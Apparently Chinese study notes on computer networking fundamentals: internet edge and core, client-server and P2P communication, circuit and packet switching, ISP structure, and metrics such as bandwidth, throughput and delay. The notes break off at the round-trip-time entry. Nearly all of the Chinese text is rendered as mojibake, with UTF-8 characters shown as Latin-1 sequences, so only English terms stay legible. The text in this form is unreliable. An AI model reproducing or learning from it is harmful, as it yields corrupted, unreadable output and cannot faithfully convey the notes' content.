ç”µè·¯äº¤æ¢ åˆ†ç»„äº¤æ¢ Packet Switching ä¸‰ç§äº¤æ¢æ–¹å¼æ¯”è¾ƒ äº’è”ç½‘çš„ç»“æ„ äº’è”ç½‘çš„æ€§èƒ½ é€Ÿç‡-æ¯”ç‰¹ bit æ‰¿è½½èƒ½åŠ›-å¸¦å®½ å®é™…æ•°æ®é‡-ååé‡ ç½‘ç»œå»¶è¿Ÿ-æ—¶å»¶ æ—¶å»¶å¸¦å®½ç§¯ å¾€è¿”æ—¶é—´ RTT åˆ©ç”¨ç‡ éæ€§èƒ½æŒ‡æ ‡ åˆ†å±‚æ¨¡å‹ ä¸ºä»€ä¹ˆè¦åˆ†å±‚ è®¡ç®—æœºç½‘ç»œçš„åˆ†å±‚æ¨¡å‹ å¤šè·¯å¤ç”¨å’Œå¤šè·¯åˆ†è§£ OSI ä¸ƒå±‚æ¨¡å‹ ä¸€äº›æ¦‚å¿µ ä»€ä¹ˆæ˜¯äº’è”ç½‘ è®¡ç®—æœºç½‘ç»œï¼ˆç®€ç§°ç½‘ç»œï¼‰ ç”±è‹¥å¹²ç»“ç‚¹å’Œè¿æ¥è¿™äº›ç»“ç‚¹çš„é“¾è·¯ç»„æˆ\näº’è”ç½‘æ˜¯\næ•°ä»¥äº¿è®¡çš„è®¡ç®—è®¾å¤‡è¿æ¥åœ¨ä¸€èµ·çš„ç½‘ç»œ å°†å„ç§ç½‘ç»œï¼ˆæ— æ•°çš„å¼‚æ„ç½‘ç»œï¼‰è¿æ¥åœ¨ä¸€èµ·çš„ç½‘ç»œ ç½‘ç»œæŠŠè®¸å¤šè®¡ç®—æœºè¿æ¥åœ¨ä¸€èµ·ï¼Œè€Œäº’è”ç½‘åˆ™æŠŠè®¸å¤šç½‘ç»œé€šè¿‡è·¯ç”±å™¨è¿æ¥åœ¨ä¸€èµ·ã€‚ä¸ç½‘ç»œç›¸è¿çš„è®¡ç®—æœºå¸¸ç§°ä¸ºä¸»æœºï¼ˆhostï¼‰æˆ–è€…ç»ˆç«¯ç³»ç»Ÿï¼ˆend systemï¼‰\nè¯¥å¦‚ä½•å‘é€/æ¥æ”¶ä¿¡æ¯ï¼Œå°±è¦ç”¨åˆ°åè®®\nä»€ä¹ˆæ˜¯åè®® åè®®å®šä¹‰äº†æ¶ˆæ¯æ ¼å¼ã€å‘é€å’Œæ¥å—æ¶ˆæ¯çš„é¡ºåºã€ä»¥åŠå‘å‡ºæˆ–æ”¶åˆ°æŒ‡å®šæ¶ˆæ¯ä¹‹åæ‰€é‡‡å–çš„è¡Œä¸ºã€‚\nè¾¹ç¼˜éƒ¨åˆ†å’Œæ ¸å¿ƒéƒ¨åˆ† è¾¹ç¼˜éƒ¨åˆ† ç”±æ‰€æœ‰è¿æ¥åœ¨äº’è”ç½‘ä¸Šçš„ä¸»æœºç»„æˆã€‚è¿™éƒ¨åˆ†æ˜¯ç”¨æˆ·ç›´æ¥ä½¿ç”¨çš„ï¼Œç”¨æ¥è¿›è¡Œé€šä¿¡ï¼ˆä¼ é€æ•°æ®ã€éŸ³é¢‘æˆ–è§†é¢‘ï¼‰å’Œèµ„æºå…±äº«ã€‚ æ ¸å¿ƒéƒ¨åˆ† ç”±å¤§é‡ç½‘ç»œå’Œè¿æ¥è¿™äº›ç½‘ç»œçš„è·¯ç”±å™¨ç»„æˆã€‚è¿™éƒ¨åˆ†æ˜¯ä¸ºè¾¹ç¼˜éƒ¨åˆ†æä¾›æœåŠ¡çš„ï¼ˆæä¾›è¿é€šæ€§å’Œäº¤æ¢ï¼‰ è¾¹ç¼˜éƒ¨åˆ†-ä¸»æœº æˆ‘ä»¬è¯´ï¼šâ€œä¸»æœº A å’Œä¸»æœº B è¿›è¡Œé€šä¿¡â€ï¼Œå®é™…ä¸Šæ˜¯æŒ‡ï¼šâ€œè¿è¡Œåœ¨ä¸»æœº A ä¸Šçš„æŸä¸ªç¨‹åºå’Œè¿è¡Œåœ¨ä¸»æœº B ä¸Šçš„å¦ä¸€ä¸ªç¨‹åºè¿›é€šä¿¡â€ã€‚ç”±äºâ€œè¿›ç¨‹â€å°±æ˜¯â€œè¿è¡Œç€çš„ç¨‹åºâ€ï¼Œå› æ­¤è¿™ä¹Ÿå°±æ˜¯æŒ‡ï¼šâ€œä¸»æœº A çš„æŸä¸ªè¿›ç¨‹å’Œä¸»æœº B ä¸Šçš„å¦ä¸€ä¸ªè¿›ç¨‹è¿›è¡Œé€šä¿¡â€ï¼Œç®€ç§°ä¸ºâ€œè®¡ç®—æœºä¹‹é—´é€šä¿¡â€ã€‚\nä¸»æœºé€šä¿¡æ–¹å¼-C/Sï¼šå®¢æˆ·-æœåŠ¡å™¨æ–¹å¼ å®¢æˆ· (client) å’ŒæœåŠ¡å™¨ (server) éƒ½æ˜¯æŒ‡é€šä¿¡ä¸­æ‰€æ¶‰åŠçš„ä¸¤ä¸ªåº”ç”¨è¿›ç¨‹ã€‚ å®¢æˆ· â€“ æœåŠ¡å™¨æ–¹å¼æ‰€æè¿°çš„æ˜¯è¿›ç¨‹ä¹‹é—´æœåŠ¡å’Œè¢«æœåŠ¡çš„å…³ç³»ã€‚ å®¢æˆ·æ˜¯æœåŠ¡çš„è¯·æ±‚æ–¹ï¼ŒæœåŠ¡å™¨æ˜¯æœåŠ¡çš„æä¾›æ–¹ã€‚ å®¢æˆ·å’ŒæœåŠ¡å™¨é—´çš„é€šä¿¡ï¼Œå¾€å¾€æ˜¯éœ€è¦ç»è¿‡äº’è”ç½‘çš„æ ¸å¿ƒéƒ¨åˆ†çš„ å®¢æˆ·ç¨‹åºï¼š\nè¢«ç”¨æˆ·è°ƒç”¨åè¿è¡Œï¼Œåœ¨é€šä¿¡æ—¶ä¸»åŠ¨å‘è¿œåœ°æœåŠ¡å™¨å‘èµ·é€šä¿¡ï¼ˆè¯·æ±‚æœåŠ¡ï¼‰ã€‚å› æ­¤ï¼Œå®¢æˆ·ç¨‹åºå¿…é¡»çŸ¥é“æœåŠ¡å™¨ç¨‹åºçš„åœ°å€ã€‚ ä¸éœ€è¦ç‰¹æ®Šçš„ç¡¬ä»¶å’Œå¾ˆå¤æ‚çš„æ“ä½œç³»ç»Ÿã€‚ æœåŠ¡å™¨ç¨‹åºï¼š\næ˜¯ä¸€ç§ä¸“é—¨ç”¨æ¥æä¾›æŸç§æœåŠ¡çš„ç¨‹åºï¼Œå¯åŒæ—¶å¤„ç†å¤šä¸ªè¿œåœ°æˆ–æœ¬åœ°å®¢æˆ·çš„è¯·æ±‚ã€‚ ç³»ç»Ÿå¯åŠ¨åå³è‡ªåŠ¨è°ƒç”¨å¹¶ä¸€ç›´ä¸æ–­åœ°è¿è¡Œç€ï¼Œè¢«åŠ¨åœ°ç­‰å¾…å¹¶æ¥å—æ¥è‡ªå„åœ°çš„å®¢æˆ·çš„é€šä¿¡è¯·æ±‚ã€‚å› æ­¤ï¼ŒæœåŠ¡å™¨ç¨‹åºä¸éœ€è¦çŸ¥é“å®¢æˆ·ç¨‹åºçš„åœ°å€ã€‚ ä¸€èˆ¬éœ€è¦æœ‰å¼ºå¤§çš„ç¡¬ä»¶å’Œé«˜çº§çš„æ“ä½œç³»ç»Ÿæ”¯æŒã€‚ å®¢æˆ·ä¸æœåŠ¡å™¨çš„é€šä¿¡å…³ç³»å»ºç«‹åï¼Œé€šä¿¡å¯ä»¥æ˜¯åŒå‘çš„ï¼Œå®¢æˆ·å’ŒæœåŠ¡å™¨éƒ½å¯å‘é€å’Œæ¥æ”¶æ•°æ®ã€‚\nå®¢æˆ·å’ŒæœåŠ¡å™¨æœ¬æ¥éƒ½æŒ‡çš„æ˜¯è®¡ç®—æœºè¿›ç¨‹ï¼ˆè½¯ä»¶ï¼‰ï¼Œä½†åœ¨è®¸å¤šå›½å¤–æ–‡çŒ®ä¸­ï¼Œç»å¸¸ä¹ŸæŠŠè¿è¡Œå®¢æˆ·ç¨‹åºçš„æœºå™¨ç§°ä¸º clientï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ä¹Ÿå¯æŠŠ client è¯‘ä¸ºâ€œå®¢æˆ·æœºâ€ï¼‰ï¼ŒæŠŠè¿è¡ŒæœåŠ¡å™¨ç¨‹åºçš„æœºå™¨ç§°ä¸º serverã€‚\nä¸»æœºé€šä¿¡æ–¹å¼-P2Pï¼šå¯¹ç­‰è¿æ¥æ–¹å¼ å¯¹ç­‰è¿æ¥ (peer-to-peerï¼Œç®€å†™ä¸º P2P) æ˜¯æŒ‡ä¸¤ä¸ªä¸»æœºåœ¨é€šä¿¡æ—¶å¹¶ä¸åŒºåˆ†å“ªä¸€ä¸ªæ˜¯æœåŠ¡è¯·æ±‚æ–¹è¿˜æ˜¯æœåŠ¡æä¾›æ–¹ã€‚ åªè¦ä¸¤ä¸ªä¸»æœºéƒ½è¿è¡Œäº†å¯¹ç­‰è¿æ¥è½¯ä»¶ (P2P è½¯ä»¶) ï¼Œå®ƒä»¬å°±å¯ä»¥è¿›è¡Œå¹³ç­‰çš„ã€å¯¹ç­‰è¿æ¥é€šä¿¡ã€‚ å¯ä»¥å‡è½»æœåŠ¡å™¨å‹åŠ›ï¼Œæé«˜ä¸»æœºèµ„æºçš„åˆ©ç”¨ç‡ã€‚ å¯èƒ½ç»è¿‡æ ¸å¿ƒéƒ¨åˆ†ï¼Œä¹Ÿå¯èƒ½ä»…åœ¨è¾¹ç¼˜éƒ¨åˆ†å®Œæˆã€‚ æ ¸å¿ƒéƒ¨åˆ† äº’è”ç½‘çš„æ ¸å¿ƒéƒ¨åˆ†ç”±äº’è”çš„è·¯ç”±å™¨/äº¤æ¢æœºç»„æˆï¼ˆinterconnected routersï¼‰ ç½‘ç»œä¸­çš„æ ¸å¿ƒéƒ¨åˆ†è¦å‘ç½‘ç»œè¾¹ç¼˜ä¸­çš„å¤§é‡ä¸»æœºæä¾›è¿é€šæ€§ï¼Œä½¿è¾¹ç¼˜éƒ¨åˆ†ä¸­çš„ä»»ä½•ä¸€ä¸ªä¸»æœºéƒ½èƒ½å¤Ÿå‘å…¶ä»–ä¸»æœºé€šä¿¡ï¼ˆå³ä¼ é€æˆ–æ¥æ”¶å„ç§å½¢å¼çš„æ•°æ®ï¼‰ã€‚ åœ¨ç½‘ç»œæ ¸å¿ƒéƒ¨åˆ†èµ·ç‰¹æ®Šä½œç”¨çš„æ˜¯è·¯ç”±å™¨ (router)ã€‚è·¯ç”±å™¨æ˜¯å®ç°åˆ†ç»„äº¤æ¢ (packet switching) çš„å…³é”®æ„ä»¶ï¼Œå…¶ä»»åŠ¡æ˜¯è½¬å‘æ”¶åˆ°çš„åˆ†ç»„ï¼Œè¿™æ˜¯ç½‘ç»œæ ¸å¿ƒéƒ¨åˆ†æœ€é‡è¦çš„åŠŸèƒ½ã€‚ ä¸»è¦çš„é€šä¿¡æ–¹å¼ï¼šç”µè·¯äº¤æ¢ï¼ˆcircuit switchingï¼‰å’Œåˆ†ç»„äº¤æ¢ï¼ˆpacket switchingï¼Œç”¨äºäº’è”ç½‘ä¸­ï¼‰\nç”µè·¯äº¤æ¢ é€šè¿‡å»ºç«‹ä¸“ç”¨é“¾è·¯æ¥å®ç°é€šä¿¡ã€‚è­¬å¦‚æ‰“ç”µè¯ï¼Œå°†ä¸€ä¸ªç”µè¯å’Œå…¶ä»–æ‰€æœ‰ç”µè¯éƒ½å»ºç«‹é“¾è·¯æ˜¯ä¸å¯èƒ½çš„ã€‚å› æ­¤åœ¨æ‰“ç”µè¯ä¹‹å‰ä½¿ ç”¨ç”µè¯äº¤æ¢æœºå°†è¿™äº›ç”µè¯è¿æ¥èµ·æ¥ï¼Œä¸ºä¸¤è€…å»ºç«‹ä¸“ç”¨é“¾è·¯ã€‚\nè¿™ç§å¿…é¡»ç»è¿‡â€œå»ºç«‹è¿æ¥ï¼ˆå ç”¨é€šä¿¡èµ„æºï¼‰â†’ é€šè¯ï¼ˆä¸€ç›´å ç”¨é€šä¿¡èµ„æºï¼‰â†’ é‡Šæ”¾è¿æ¥ï¼ˆå½’è¿˜é€šä¿¡èµ„æºï¼‰â€ä¸‰ä¸ªæ­¥éª¤çš„äº¤æ¢æ–¹å¼ç§°ä¸ºç”µè·¯äº¤æ¢ã€‚\nä¼˜ç‚¹ï¼š\nèµ„æºä¸“ç”¨ï¼Œæ— å…±äº«ï¼Œä¿è¯äº†æ€§èƒ½å’Œä½“éªŒ ä¼ ç»Ÿç”µè¯ç½‘ç»œä¸­é‡‡ç”¨ã€‚ ç¼ºç‚¹ï¼š ç”µè·¯äº¤æ¢æ˜¯ä¸é€‚åˆäº’è”ç½‘çš„ï¼Œå› ä¸ºäº’è”ç½‘å…·æœ‰çªå‘æ€§ï¼Œé€šä¿¡é‡å¯èƒ½çªç„¶å¢å¤§ï¼Œå¯¼è‡´æˆ‘ä»¬å¾ˆéš¾å»æ¶‰åŠç”µè·¯çš„å®¹é‡ï¼ˆè‹¥è®¾è®¡é€šä¿¡é“¾è·¯æ—¶æŒ‰ç…§å³°å€¼çš„æ•°æ®é‡è®¾è®¡ï¼Œåˆ™åœ¨å¹³æ—¶é€šä¿¡é“¾è·¯çš„åˆ©ç”¨ç‡å¾ˆä½ï¼‰ã€‚\nå½“ä½¿ç”¨ç”µè·¯äº¤æ¢æ¥ä¼ é€è®¡ç®—æœºæ•°æ®æ—¶ï¼Œå…¶çº¿è·¯çš„ä¼ è¾“æ•ˆç‡å¾€å¾€å¾ˆä½ã€‚è¿™æ˜¯å› ä¸ºè®¡ç®—æœºæ•°æ®æ˜¯çªå‘å¼åœ°å‡ºç°åœ¨ä¼ è¾“çº¿è·¯ä¸Šçš„ï¼Œå› æ­¤çº¿è·¯ä¸ŠçœŸæ­£ç”¨æ¥ä¼ é€æ•°æ®çš„æ—¶é—´å¾€å¾€ä¸åˆ° 10%ç”šè‡³ 1%ã€‚å·²è¢«ç”¨æˆ·å ç”¨çš„é€šä¿¡çº¿è·¯èµ„æºåœ¨ç»å¤§éƒ¨åˆ†æ—¶é—´é‡Œéƒ½æ˜¯ç©ºé—²çš„ã€‚\nåˆ†ç»„äº¤æ¢ Packet Switching åˆ†ç»„äº¤æ¢åˆ™é‡‡ç”¨å­˜å‚¨è½¬å‘æŠ€æœ¯\næˆ‘ä»¬æŠŠè¦å‘é€çš„æ•´å—æ•°æ®ç§°ä¸ºä¸€ä¸ªæŠ¥æ–‡(message)ï¼ŒæŠŠè¾ƒé•¿çš„æŠ¥æ–‡åˆ’åˆ†æˆä¸ºä¸€ä¸ªä¸ªæ›´å°çš„ç­‰é•¿æ•°æ®æ®µï¼Œæ¯ä¸€ä¸ªæ•°æ®æ®µå‰é¢ï¼ŒåŠ ä¸Šä¸€äº›ç”±å¿…è¦çš„æ§åˆ¶ä¿¡æ¯ç»„æˆçš„é¦–éƒ¨(header)åï¼Œå°±æ„æˆäº†ä¸€ä¸ªåˆ†ç»„(packet)ã€‚åˆ†ç»„åˆç§°ä¸ºâ€œåŒ…â€ï¼Œè€Œåˆ†ç»„çš„é¦–éƒ¨ä¹Ÿå¯ç§°ä¸ºâ€œåŒ…å¤´â€ã€‚ å› æ­¤ï¼Œåœ¨åˆ†ç»„äº¤æ¢ä¸­æ²¡æœ‰ä¸“ç”¨çš„é“¾è·¯ï¼Œç›¸å½“äºæŠŠæ‰€æœ‰ä¿¡æ¯éƒ½åˆ‡åˆ†å¹¶æ‰“åŒ…æˆä¸€ä¸ªä¸ªåŒ…ï¼Œå†åŒä¸€å‘é€ç»™æ¥æ”¶æ–¹\nåˆ†ç»„äº¤æ¢çš„è¿‡ç¨‹ï¼š ä½äºç½‘ç»œè¾¹ç¼˜çš„ä¸»æœºå’Œä½äºç½‘ç»œæ ¸å¿ƒéƒ¨åˆ†çš„è·¯ç”±å™¨éƒ½æ˜¯è®¡ç®—æœºï¼Œä½†å®ƒä»¬çš„ä½œç”¨å´å¾ˆä¸ä¸€æ ·ã€‚ ä¸»æœºæ˜¯ä¸ºç”¨æˆ·è¿›è¡Œä¿¡æ¯å¤„ç†çš„ï¼Œå¹¶ä¸”å¯ä»¥å’Œå…¶ä»–ä¸»æœºé€šè¿‡ç½‘ç»œäº¤æ¢ä¿¡æ¯ã€‚ è·¯ç”±å™¨åˆ™æ˜¯ç”¨æ¥è½¬å‘åˆ†ç»„çš„ï¼Œå³è¿›è¡Œåˆ†ç»„äº¤æ¢çš„ã€‚è·¯ç”±å™¨æ”¶åˆ°ä¸€ä¸ªåˆ†ç»„ï¼Œå…ˆæš‚æ—¶å­˜å‚¨ä¸€ä¸‹ï¼Œæ£€æŸ¥å…¶é¦–éƒ¨ï¼ŒæŸ¥æ‰¾è½¬å‘è¡¨ï¼ŒæŒ‰ç…§é¦–éƒ¨ä¸­çš„ç›®çš„åœ°å€ï¼Œæ‰¾åˆ°åˆé€‚çš„æ¥å£è½¬å‘å‡ºå»ï¼ŒæŠŠåˆ†ç»„äº¤ç»™ä¸‹ä¸€ä¸ªè·¯ç”±å™¨ã€‚è¿™æ ·ä¸€æ­¥ä¸€æ­¥åœ°ï¼ˆæœ‰æ—¶ä¼šç»è¿‡å‡ åä¸ªä¸åŒçš„è·¯ç”±å™¨ï¼‰ä»¥å­˜å‚¨è½¬å‘çš„æ–¹å¼ï¼ŒæŠŠåˆ†ç»„äº¤ä»˜æœ€ç»ˆçš„ç›®çš„ä¸»æœºã€‚ å„è·¯ç”±å™¨ä¹‹é—´å¿…é¡»ç»å¸¸äº¤æ¢å½¼æ­¤æŒæ¡çš„è·¯ç”±ä¿¡æ¯ï¼Œä»¥ä¾¿åˆ›å»ºå’ŒåŠ¨æ€ç»´æŠ¤è·¯ç”±å™¨ä¸­çš„è½¬å‘è¡¨ï¼Œä½¿å¾—è½¬å‘è¡¨èƒ½å¤Ÿåœ¨æ•´ä¸ªç½‘ç»œæ‹“æ‰‘å‘ç”Ÿå˜åŒ–æ—¶åŠæ—¶æ›´æ–°ã€‚\nåˆ†ç»„äº¤æ¢çš„ç¼ºç‚¹ï¼š\nåˆ†ç»„åœ¨å„è·¯ç”±å™¨å­˜å‚¨è½¬å‘æ—¶éœ€è¦æ’é˜Ÿï¼Œè¿™å°±ä¼šé€ æˆä¸€å®šçš„æ—¶å»¶ã€‚åˆ†ç»„äº¤æ¢å¹¶æ²¡æœ‰â€œä¸“ç”¨â€é“¾è·¯ï¼Œå› æ­¤å¯èƒ½å‘ç”Ÿæ‹¥å¡ é¦–éƒ¨çš„å¼€é”€ å¦‚æœè·¯ç”±çš„ç¼“å­˜å·²æ»¡ï¼Œåˆ™åˆ†ç»„å¯èƒ½ä¼šè¢«ä¸¢å¼ƒï¼Œä¿¡æ¯å¯èƒ½ä¼šä¸¢å¤±ï¼Œé€ æˆä¸¢åŒ… åˆ†ç»„äº¤æ¢çš„ä¼˜ç‚¹ï¼š ä¸‰ç§äº¤æ¢æ–¹å¼æ¯”è¾ƒ ä¸‰ç§äº¤æ¢æ–¹å¼åœ¨æ•°æ®ä¼ é€é˜¶æ®µçš„ä¸»è¦ç‰¹ç‚¹ï¼š\nç”µè·¯äº¤æ¢â€”æ•´ä¸ªæŠ¥æ–‡çš„æ¯”ç‰¹æµè¿ç»­åœ°ä»æºç‚¹ç›´è¾¾ç»ˆç‚¹ï¼Œå¥½åƒåœ¨ä¸€ä¸ªç®¡é“ä¸­ä¼ é€ã€‚ æŠ¥æ–‡äº¤æ¢â€”æ•´ä¸ªæŠ¥æ–‡å…ˆä¼ é€åˆ°ç›¸é‚»ç»“ç‚¹ï¼Œå…¨éƒ¨å­˜å‚¨ä¸‹æ¥åæŸ¥æ‰¾è½¬å‘è¡¨ï¼Œè½¬å‘åˆ°ä¸‹ä¸€ä¸ªç»“ç‚¹ã€‚ åˆ†ç»„äº¤æ¢â€”å•ä¸ªåˆ†ç»„ï¼ˆè¿™åªæ˜¯æ•´ä¸ªæŠ¥æ–‡çš„ä¸€éƒ¨åˆ†ï¼‰ä¼ é€åˆ°ç›¸é‚»ç»“ç‚¹ï¼Œå­˜å‚¨ä¸‹æ¥åæŸ¥æ‰¾è½¬å‘è¡¨ï¼Œè½¬å‘åˆ°ä¸‹ä¸€ä¸ªç»“ç‚¹ å› ä¸ºç”¨æˆ·ä¸æ˜¯æ—¶åˆ»åœ¨è¿›è¡Œäº¤äº’ï¼Œæ‰€ä»¥åˆ†ç»„äº¤æ¢å¯ä»¥æ›´å¥½åœ°å°†è®¡ç®—æœºçš„èµ„æºåˆ©ç”¨èµ·æ¥\näº’è”ç½‘çš„ç»“æ„ ç«¯ç³»ç»Ÿ/ä¸»æœºï¼Œé€šè¿‡è¿æ¥ access ISPï¼ˆInternet Service Providersï¼‰æ¥å…¥äº’è”ç½‘ï¼ˆå°åŒºã€å…¬å¸ã€æˆ–å¤§å­¦ï¼Œéƒ½å¯è§†ä¸º access ISP çš„ä¾‹å­ï¼‰ï¼ŒAccess ISP ä¹Ÿéœ€è¦äº’ç›¸è¿æ¥ï¼Œç”±æ­¤ä»»æ„çš„ä¸¤ä¸ªä¸»æœºæ‰å¯ä»¥äº’ç›¸å‘é€åˆ†ç»„ï¼Œç”±æ­¤æ„æˆéå¸¸å¤æ‚çš„äº’è”ç½‘ â€“ network of networks\nä¸å¯èƒ½å°†æ¯ä¸€ä¸ª access net éƒ½é€šè¿‡é“¾è·¯è¿æ¥èµ·æ¥=ã€‹ä½¿ç”¨è·¯ç”±å™¨äº¤æ¢ï¼Œæ„å»ºå…¨çƒ ISP ä½†æ˜¯å¯èƒ½ä¼šæœ‰ä¸åŒå…¬å¸æ„å»º ISPï¼Œå½¢æˆç«äº‰=ã€‹ä½¿ç”¨ç½‘ç»œäº¤æ¢èŠ‚ç‚¹ IXP åœ¨ ISP ä¹‹é—´äº¤äº’ åŒä¸€ä¸ªåŒºåŸŸå±äºä¸€å±‚=ã€‹ä½¿ç”¨ regional net åŒºåŸŸç½‘ç»œå°†åŒä¸€åŒºåŸŸçš„è¯·æ±‚ä¸€èµ·ä¸Šä¼  ä¹‹å Google ç­‰ç½‘ç»œæœåŠ¡ä¾›åº”å•†å°±å¯ä»¥åœ¨è¿™ä¸ªç½‘ç»œä¸Šæ„å»ºè‡ªå·±çš„æœåŠ¡ äº’è”ç½‘çš„æ€§èƒ½ é€Ÿç‡-æ¯”ç‰¹ bit æ¯”ç‰¹ï¼ˆbitï¼‰æ˜¯è®¡ç®—æœºä¸­æ•°æ®é‡çš„å•ä½ï¼Œä¹Ÿæ˜¯ä¿¡æ¯è®ºä¸­ä½¿ç”¨çš„ä¿¡æ¯é‡çš„å•ä½ã€‚ æ¯”ç‰¹ï¼ˆbitï¼‰æ¥æºäº binary digitï¼Œæ„æ€æ˜¯ä¸€ä¸ªâ€œäºŒè¿›åˆ¶æ•°å­—â€ï¼Œå› æ­¤ä¸€ä¸ªæ¯”ç‰¹å°±æ˜¯äºŒè¿›åˆ¶æ•°å­—ä¸­çš„ä¸€ä¸ª 1 æˆ– 0ã€‚ é€Ÿç‡æ˜¯è®¡ç®—æœºç½‘ç»œä¸­æœ€é‡è¦çš„ä¸€ä¸ªæ€§èƒ½æŒ‡æ ‡ï¼ŒæŒ‡çš„æ˜¯æ•°æ®çš„ä¼ é€é€Ÿç‡ï¼Œå®ƒä¹Ÿç§°ä¸ºæ•°æ®ç‡ (data rate) æˆ–æ¯”ç‰¹ç‡ (bit rate)ã€‚ é€Ÿç‡çš„å•ä½æ˜¯ bit/sï¼Œæˆ– kbit/sã€Mbit/sã€ Gbit/s ç­‰ã€‚é€Ÿç‡å¾€å¾€æ˜¯æŒ‡é¢å®šé€Ÿç‡æˆ–æ ‡ç§°é€Ÿç‡ï¼Œéå®é™…è¿è¡Œé€Ÿç‡ã€‚ æ‰¿è½½èƒ½åŠ›-å¸¦å®½ ä¸¤ç§ä¸åŒæ„ä¹‰ï¼š\nâ€œå¸¦å®½â€(bandwidth) æœ¬æ¥æ˜¯æŒ‡ä¿¡å·å…·æœ‰çš„é¢‘å¸¦å®½åº¦ï¼Œå…¶å•ä½æ˜¯èµ«ï¼ˆæˆ–åƒèµ«ã€å…†èµ«ã€å‰èµ«ç­‰ï¼‰ã€‚ åœ¨è®¡ç®—æœºç½‘ç»œä¸­ï¼Œå¸¦å®½ç”¨æ¥è¡¨ç¤ºç½‘ç»œä¸­æŸé€šé“ä¼ é€æ•°æ®çš„èƒ½åŠ›ã€‚è¡¨ç¤ºåœ¨å•ä½æ—¶é—´å†…ç½‘ç»œä¸­çš„æŸä¿¡é“æ‰€èƒ½é€šè¿‡çš„â€œæœ€é«˜æ•°æ®ç‡â€ã€‚å•ä½æ˜¯ bit/sï¼Œå³ â€œæ¯”ç‰¹æ¯ç§’â€ã€‚ åœ¨â€œå¸¦å®½â€çš„ä¸Šè¿°ä¸¤ç§è¡¨è¿°ä¸­ï¼Œå‰è€…ä¸ºé¢‘åŸŸç§°è°“ï¼Œè€Œåè€…ä¸ºæ—¶åŸŸç§°è°“ï¼Œå…¶æœ¬è´¨æ˜¯ç›¸åŒçš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€æ¡é€šä¿¡é“¾è·¯çš„â€œå¸¦å®½â€è¶Šå®½ï¼Œå…¶æ‰€èƒ½ä¼ è¾“çš„â€œæœ€é«˜æ•°æ®ç‡â€ä¹Ÿè¶Šé«˜ã€‚\nå®é™…æ•°æ®é‡-ååé‡ ååé‡ (throughput) è¡¨ç¤ºåœ¨å•ä½æ—¶é—´å†…é€šè¿‡æŸä¸ªç½‘ç»œï¼ˆæˆ–ä¿¡é“ã€æ¥å£ï¼‰çš„æ•°æ®é‡ã€‚ ååé‡æ›´ç»å¸¸åœ°ç”¨äºå¯¹ç°å®ä¸–ç•Œä¸­çš„ç½‘ç»œçš„ä¸€ç§æµ‹é‡ï¼Œä»¥ä¾¿çŸ¥é“å®é™…ä¸Šåˆ°åº•æœ‰å¤šå°‘æ•°æ®é‡èƒ½å¤Ÿé€šè¿‡ç½‘ç»œã€‚ ååé‡å—ç½‘ç»œçš„å¸¦å®½æˆ–ç½‘ç»œçš„é¢å®šé€Ÿç‡çš„é™åˆ¶ã€‚ ç½‘ç»œå»¶è¿Ÿ-æ—¶å»¶ æ—¶å»¶ (delay æˆ– latency) æ˜¯æŒ‡æ•°æ®ï¼ˆä¸€ä¸ªæŠ¥æ–‡æˆ–åˆ†ç»„ï¼Œç”šè‡³æ¯”ç‰¹ï¼‰ä»ç½‘ç»œï¼ˆæˆ–é“¾è·¯ï¼‰çš„ä¸€ç«¯ä¼ é€åˆ°å¦ä¸€ç«¯æ‰€éœ€çš„æ—¶é—´ã€‚æœ‰æ—¶ä¹Ÿç§°ä¸ºå»¶è¿Ÿæˆ–è¿Ÿå»¶ã€‚\nç½‘ç»œä¸­çš„æ—¶å»¶ç”±ä»¥ä¸‹å‡ ä¸ªä¸åŒçš„éƒ¨åˆ†ç»„æˆï¼š\nå‘é€æ—¶å»¶ï¼ˆTransmission delayï¼‰ï¼šä¸»æœºæˆ–è·¯ç”±å™¨å‘é€æ•°æ®å¸§æ‰€éœ€è¦çš„æ—¶é—´\rä¼ æ’­æ—¶å»¶ï¼ˆPropagation delayï¼‰ï¼šç”µç£æ³¢åœ¨ä¿¡é“ä¸­ä¼ æ’­ä¸€å®šçš„è·ç¦»éœ€è¦èŠ±è´¹çš„æ—¶é—´ï¼ˆ1000 km é•¿çš„å…‰çº¤çº¿è·¯äº§ç”Ÿçš„ä¼ æ’­æ—¶å»¶å¤§çº¦ä¸º 5 msï¼‰\rå¤„ç†æ—¶å»¶ï¼ˆProcessing delayï¼‰ï¼šä¸»æœºæˆ–è·¯ç”±å™¨åœ¨æ”¶åˆ°åˆ†ç»„æ—¶è¦èŠ±è´¹ä¸€å®šçš„æ—¶é—´è¿›è¡Œå¤„ç† æ’é˜Ÿæ—¶å»¶ï¼ˆQueueing delayï¼‰åˆ†ç»„åœ¨ç»è¿‡ç½‘ç»œä¼ è¾“æ—¶ï¼Œè¦ç»è¿‡è®¸å¤šè·¯ç”±å™¨ã€‚ä½†åˆ†ç»„åœ¨è¿›å…¥è·¯ç”±å™¨åè¦å…ˆåœ¨è¾“å…¥é˜Ÿåˆ—ä¸­æ’é˜Ÿç­‰å¾…å¤„ç†ï¼ˆå½“ç½‘ç»œçš„é€šä¿¡é‡å¾ˆå¤§æ—¶ä¼šå‘ç”Ÿé˜Ÿåˆ—æº¢å‡ºï¼Œä½¿åˆ†ç»„ä¸¢å¤±ï¼Œè¿™ç›¸å½“äºæ’é˜Ÿæ—¶å»¶ä¸ºæ— ç©·å¤§ï¼‰ å¯¹äºé«˜é€Ÿç½‘ç»œé“¾è·¯ï¼Œæˆ‘ä»¬æé«˜çš„ä»…ä»…æ˜¯æ•°æ®çš„å‘é€é€Ÿç‡è€Œä¸æ˜¯æ¯”ç‰¹åœ¨é“¾è·¯ä¸Šçš„ä¼ æ’­é€Ÿç‡ï¼Œæé«˜é“¾è·¯å¸¦å®½å‡å°äº†æ•°æ®çš„å‘é€æ—¶å»¶ã€‚ä¼ æ’­é€Ÿç‡ç”±é“¾è·¯çš„ç‰©ç†ä»‹è´¨å†³å®šï¼Œä¾‹å¦‚å°†é“œå¯¼çº¿æ¢æˆå…‰çº¤ã€‚ æ—¶å»¶å¸¦å®½ç§¯ é“¾è·¯çš„æ—¶å»¶å¸¦å®½ç§¯åˆç§°ä¸ºä»¥æ¯”ç‰¹ä¸ºå•ä½çš„é“¾è·¯é•¿åº¦ã€‚\nå¾€è¿”æ—¶é—´ RTT å¾€è¿”æ—¶é—´ RTT (round-trip time) 